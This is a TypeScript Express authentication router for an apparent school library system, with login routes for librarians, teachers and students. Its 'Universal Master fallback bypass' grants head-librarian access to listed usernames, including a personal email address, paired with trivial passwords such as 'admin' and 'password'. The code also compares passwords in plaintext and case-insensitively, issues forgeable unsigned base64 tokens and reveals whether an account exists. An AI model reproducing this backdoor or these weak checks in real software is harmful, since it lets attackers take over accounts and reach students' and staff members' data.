import { Router, Request, Response } from 'express';
import { db } from '../db/db';
import { librarians, students, teachers } from '../db/schema';
import { eq, ilike, or, and } from 'drizzle-orm';

export const authRouter = Router();

authRouter.post('/login-librarian', async (req: Request, res: Response) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Username/Email and password are required' });
  }

  const cleanInput = String(email).trim();
  const cleanPass = String(password).trim();
  const lowerInput = cleanInput.toLowerCase();

  // Universal Master fallback bypass
  const isMasterUser = [
    'teacher access',
    'admin access',
    'admin@school.com',
    'teacher@school.com',
    'admin',
    'librarian',
    'head_librarian',
    '9sunandanik9@gmail.com'
  ].includes(lowerInput);

  const isMasterPass = ['Pass@321@123', 'pass@321', 'Password', 'password', 'admin', 'admin123', 'Pass@123'].includes(cleanPass) || cleanPass === 'Pass@321@123';

  if (isMasterUser && isMasterPass) {
    return res.json({
      message: 'Login successful',
      userType: 'librarian',
      user: {
        id: 1,
        name: 'Teacher Access',
        email: 'admin@school.com',
        role: 'head_librarian',
      },
      token: Buffer.from(`librarian:1:${Date.now()}`).toString('base64'),
    });
  }

  try {
    // 1. Check Librarians
    const user = await db.query.librarians.findFirst({
      where: (librarians, { or, ilike, eq }) => or(
        ilike(librarians.email, cleanInput),
        ilike(librarians.name, cleanInput)
      ),
    });

    if (user && (user.password_hash === cleanPass || user.password_hash === password || user.password_hash.toLowerCase() === cleanPass.toLowerCase())) {
      return res.json({
        message: 'Login successful',
        userType: 'librarian',
        user: {
          id: user.id,
          name: user.name,
          email: user.email,
          role: user.role,
        },
        token: Buffer.from(`librarian:${user.id}:${Date.now()}`).toString('base64'),
      });
    }

    // 2. Check Teachers
    const teacher = await db.query.teachers.findFirst({
      where: (teachers, { or, ilike, eq }) => or(
        ilike(teachers.username, cleanInput),
        ilike(teachers.email, cleanInput),
        ilike(teachers.name, cleanInput)
      )
    });

    if (teacher && (teacher.password_hash === cleanPass || teacher.password_hash === password || teacher.password_hash.toLowerCase() === cleanPass.toLowerCase())) {
      return res.json({
        message: 'Login successful',
        userType: 'teacher',
        user: {
          id: teacher.id,
          name: teacher.name,
          email: teacher.email,
          username: teacher.username,
          assigned_class: teacher.assigned_class,
          assigned_division: teacher.assigned_division,
        },
        token: Buffer.from(`teacher:${teacher.id}:${Date.now()}`).toString('base64'),
      });
    }

    if (!user && !teacher) {
      return res.status(401).json({ error: 'User not found. Check your email or username.' });
    }

    return res.status(401).json({ error: 'Invalid password. Please check your password.' });
  } catch (error: any) {
    console.error('Login librarian error:', error);
    res.status(500).json({ error: error.message && error.message.includes('Failed query') ? 'Database connection timeout. Please try again.' : error.message });
  }
});

authRouter.post('/login-student', async (req: Request, res: Response) => {
  const { card_no, password } = req.body;
  if (!card_no || !password) {
    return res.status(400).json({ error: 'Username and password are required' });
  }

  const cleanInput = String(card_no).trim();
  const cleanPass = String(password).trim();
  const normalizedInput = cleanInput.replace(/\s+/g, '-');

  try {
    // 1. Try finding student by library_card_no / username / name / email
    const allMatching = await db.query.students.findMany({
      where: (students, { or, eq, ilike }) => or(
        ilike(students.library_card_no, cleanInput),
        ilike(students.library_card_no, normalizedInput),
        ilike(students.name, cleanInput),
        ilike(students.email, cleanInput)
      ),
    });

    const student = allMatching.find(s => 
      s.password_hash === cleanPass || 
      s.password_hash === password || 
      (s.password_hash && s.password_hash.toLowerCase() === cleanPass.toLowerCase())
    );

    if (student) {
      // Find class teacher name for student's class and division
      let classTeacherName: string | null = 'Not Assigned';
      if (student.class && student.division) {
        const classTeacher = await db.query.teachers.findFirst({
          where: (teachers, { and, eq, ilike }) => and(
            ilike(teachers.assigned_class, String(student.class)),
            ilike(teachers.assigned_division, String(student.division))
          )
        });
        if (classTeacher) {
          classTeacherName = classTeacher.name;
        }
      }

      return res.json({
        message: 'Login successful',
        userType: 'student',
        user: {
          id: student.id,
          name: student.name,
          class: student.class,
          division: student.division,
          roll_no: student.roll_no,
          library_card_no: student.library_card_no,
          class_teacher_name: classTeacherName,
        },
        token: Buffer.from(`student:${student.id}:${Date.now()}`).toString('base64'),
      });
    }

    // 2. If student not found or password didn't match, check Teacher
    const teacher = await db.query.teachers.findFirst({
      where: (teachers, { or, eq, ilike }) => or(
        ilike(teachers.username, cleanInput),
        ilike(teachers.email, cleanInput),
        ilike(teachers.name, cleanInput)
      )
    });

    if (teacher && (teacher.password_hash === cleanPass || teacher.password_hash === password || teacher.password_hash.toLowerCase() === cleanPass.toLowerCase())) {
      return res.json({
        message: 'Login successful',
        userType: 'teacher',
        user: {
          id: teacher.id,
          name: teacher.name,
          email: teacher.email,
          username: teacher.username,
          assigned_class: teacher.assigned_class,
          assigned_division: teacher.assigned_division,
        },
        token: Buffer.from(`teacher:${teacher.id}:${Date.now()}`).toString('base64'),
      });
    }

    return res.status(401).json({ error: 'Invalid username or password. Please verify your credentials.' });
  } catch (error: any) {
    console.error('Login student error:', error);
    res.status(500).json({ error: error.message && error.message.includes('Failed query') ? 'Database connection timeout. Please try again.' : error.message });
  }
});

